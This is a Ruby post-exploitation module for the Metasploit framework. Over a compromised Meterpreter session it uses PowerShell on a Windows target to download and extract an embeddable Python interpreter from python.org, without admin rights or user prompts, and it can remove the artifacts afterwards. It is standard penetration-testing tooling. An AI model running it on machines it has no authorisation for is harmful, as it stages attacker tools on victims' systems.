##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Install Python for Windows',
        'Description' => %q{
          This module places an embeddable Python3 distribution onto the target file system,
          granting pentesters access to a lightweight Python interpreter.
          This module does not require administrative privileges or user interaction with
          installation prompts.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Michael Long <bluesentinel[at]protonmail.com>'],
        'Arch' => [ARCH_X86, ARCH_X64],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter'],
        'References'	=> [
          ['URL', 'https://docs.python.org/3/using/windows.html#windows-embeddable'],
          ['URL', 'https://attack.mitre.org/techniques/T1064/']
        ]
      )
    )
    register_options(
      [
        OptString.new('PYTHON_VERSION', [true, 'Python version to download', '3.8.2']),
        OptString.new('PYTHON_URL', [true, 'URL to Python distributions', 'https://www.python.org/ftp/python/']),
        OptString.new('FILE_PATH', [true, 'File path to store the python zip file; current directory by default', '.\\python-3.8.2-embed-win32.zip']),
        OptBool.new('CLEANUP', [false, 'Remove module artifacts; set to true when ready to cleanup', false])
      ]
    )
  end

  def run
    python_folder_path = File.basename(datastore['FILE_PATH'], File.extname(datastore['FILE_PATH']))
    python_exe_path = "#{python_folder_path}\\python.exe"
    python_url = "#{datastore['PYTHON_URL']}#{datastore['PYTHON_VERSION']}/python-#{datastore['PYTHON_VERSION']}-embed-win32.zip"

    # check if PowerShell is available
    psh_path = '\\WindowsPowerShell\\v1.0\\powershell.exe'
    unless file? "%WINDIR%\\System32#{psh_path}"
      fail_with(Failure::NotVulnerable, 'No powershell available.')
    end

    # Cleanup module artifacts
    if datastore['CLEANUP']
      print_status('Removing module artifacts')
      script = 'Stop-Process -Name "python" -Force; '
      script << "Remove-Item -Force #{datastore['FILE_PATH']}; "
      script << "Remove-Item -Force -Recurse #{python_folder_path}; "
      psh_exec(script)
      return
    end

    # download python embeddable zip file
    script = '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;'
    script << "Invoke-WebRequest -Uri #{python_url} -OutFile #{datastore['FILE_PATH']}; "
    print_status("Downloading Python embeddable zip from #{python_url}")
    psh_exec(script)

    # confirm python zip file is present
    unless file? datastore['FILE_PATH']
      fail_with(Failure::NotFound, "Failed to download #{datastore['PYTHON_URL']}")
    end

    # extract python embeddable zip file
    script = "Expand-Archive #{datastore['FILE_PATH']}; "
    print_status("Extracting Python zip file: #{datastore['FILE_PATH']}")
    psh_exec(script)

    # confirm python.exe is present
    unless file? python_exe_path
      fail_with(Failure::NotFound, python_exe_path)
    end

    # display location of python interpreter with example command
    print_status('Ready to execute Python; spawn a command shell and enter:')
    print_good("#{python_exe_path} -c \"print('Hello, world!')\"")
    print_warning('Avoid using this python.exe interactively, as it will likely hang your terminal; use script files or 1 liners instead')
  end
end
